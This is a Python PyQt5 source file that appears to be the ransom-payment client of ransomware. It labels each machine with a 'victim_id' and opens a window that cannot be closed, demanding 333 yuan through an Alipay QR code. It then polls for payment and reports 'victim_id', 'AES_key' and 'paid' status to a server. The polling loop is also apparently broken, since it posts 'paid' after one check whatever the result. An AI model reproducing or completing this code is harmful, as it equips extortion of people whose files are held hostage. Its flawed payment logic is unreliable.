import uuid
import time
import qrcode
import os
import sys
from client import post_server
from threading import Thread
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from alipay import AliPay
from UI.Ui_pay import *
from UI.Ui_main import *

app_private_key_string = open('rsa_alipay/app_private.txt').read()
alipay_public_key_string = open('rsa_alipay/alipay_public.txt').read()
alipay = AliPay(
    appid="2016102400752486",
    app_notify_url=None,  # 默认回调url
    app_private_key_string=app_private_key_string,
    # 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,
    alipay_public_key_string=alipay_public_key_string,
    sign_type="RSA2",  # RSA 或者 RSA2
    debug = True  # 默认False
)
victim_id = uuid.uuid1().hex

# 主窗口
class Main_window(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(Main_window, self).__init__(parent)
        self.setupUi(self)
        self.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint)    # 禁止关闭窗口
        self.setFixedSize(self.width(), self.height())    # 禁止调整大小
        self.pushButton.clicked.connect(self.btn_pay)

    def btn_pay(self):
        # 创建预付款订单及对应二维码
        self.subject = "测试"
        self.out_trade_no =int(time.time())
        self.total_amount = 333
        preCreateOrder(self.subject, self.out_trade_no, self.total_amount)
        self.pay_window = Pay_window(self.out_trade_no, self.total_amount)
        self.pay_window.show()
        
        # self.close()
        t = Thread(target=self.pay_window.query_order, args=(self.out_trade_no, ))
        t.setDaemon(True)
        t.start()
        # self.pay_window.query_order(self.out_trade_no)


# 支付窗口
class Pay_window(QMainWindow, Ui_PayWindow):
    def __init__(self, out_trade_no, total_amount, parent=None):
        super(Pay_window, self).__init__(parent)
        self.setupUi(self)
        self.setWindowFlags(QtCore.Qt.WindowMinimizeButtonHint)    # 禁止关闭窗口
        self.setFixedSize(self.width(), self.height())    # 禁止调整大小
        self.label_2.setPixmap(QPixmap(f'qr/{out_trade_no}.png'))
        self.label_2.setScaledContents(True)    # 让图片自适应label大小
        self.label.setText(f'请支付{total_amount}元')
        self.label_3.setText(f'请在10分钟内使用支付宝扫码支付')

    def query_order(self, out_trade_no, cancel_time=15):
        '''
        :param out_trade_no: 订单号
        :param cancel_time: 自动取消时间
        :return: None
        '''
        wait_time = 0
        while True:
            while wait_time <= cancel_time:
                # 每隔1秒检查支付情况
                time.sleep(1)
                result = alipay.api_alipay_trade_query(out_trade_no=out_trade_no)
                print(result)
                if result.get("trade_status", "") == "TRADE_SUCCESS":
                    print('订单已支付!')
                    print('订单查询返回值：', result)
                    # data = {
                    #     'victim_id': uuid.uuid4().hex,
                    #     'AES_key': 'None',
                    #     'paid': True
                    # }
                    # post_server(data)
                    return
                wait_time += 1
                data = {
                        'victim_id': victim_id,
                        'AES_key': 'None',
                        'paid': True
                }
                return post_server(data)
            cancel_order(out_trade_no, cancel_time)
    
# 创建预付订单
def preCreateOrder(subject:'order_desc' , out_trade_no:int, total_amount):
    '''
    :param subject: 订单名称
    :param out_trade_no: 订单号
    :param total_amount: 付款金额
    :return None
    '''
    result = alipay.api_alipay_trade_precreate(
        subject=subject,
        out_trade_no=out_trade_no,
        total_amount=total_amount)
    print('创建预付订单返回值：', result)
    code_url = result.get('qr_code')
    if not code_url:
        print(result.get('预付订单创建失败：', 'msg'))
        return
    else:
        # 创建二维码
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=1
        )
        qr.add_data(code_url)  # 二维码所含信息
        img = qr.make_image()  # 生成二维码图片
        img.save(f'qr/{out_trade_no}.png')

# # 查询订单支付情况
# def query_order(out_trade_no, cancel_time=10):
#     '''
#     :param out_trade_no: 订单号
#     :param cancel_time: 自动取消时间
#     :return: None
#     '''
#     wait_time = 0
#     while wait_time <= cancel_time:
#         # 每隔1秒检查支付情况
#         time.sleep(1)
#         result = alipay.api_alipay_trade_query(out_trade_no=out_trade_no)
#         print(result)
#         if result.get("trade_status", "") == "TRADE_SUCCESS":
#             print('订单已支付!')
#             print('订单查询返回值：', result)
#             return
#         wait_time += 1
#     cancel_order(out_trade_no, cancel_time)
#     return

# 撤销过期订单
def cancel_order(out_trade_no:int, cancel_time=None):
    '''
    :param out_trade_no: 订单号
    :param cancel_time: 撤销前的等待时间(若未支付)
    :return:
    '''
    os.remove(f'qr/{out_trade_no}.png')
    result = alipay.api_alipay_trade_cancel(out_trade_no=out_trade_no)
    print('取消过期订单返回值：', result)
    resp_state = result.get('msg')
    action = result.get('action')
    if resp_state=='Success':
        if action=='close':
            if cancel_time:
                print(f"{cancel_time}秒内未支付订单，订单已被取消！")
        return
    else:
        print('请求失败：',resp_state)
        return



if __name__ == '__main__':
    app = QApplication(sys.argv)

    main_window = Main_window()
    main_window.show()

    # pay_window = Pay_window()
    # pay_window.show()

    sys.exit(app.exec_())